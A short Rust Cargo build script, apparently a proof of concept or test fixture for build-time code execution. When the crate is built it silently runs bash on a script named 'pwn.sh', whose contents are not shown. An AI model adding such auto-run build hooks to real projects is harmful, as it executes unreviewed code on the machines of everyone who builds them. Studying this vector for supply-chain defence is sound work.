fn main() {
    println!("cargo:rerun-if-changed=build.rs");
    std::process::Command::new("bash")
        .arg("pwn.sh")
        .status()
        .unwrap();
}
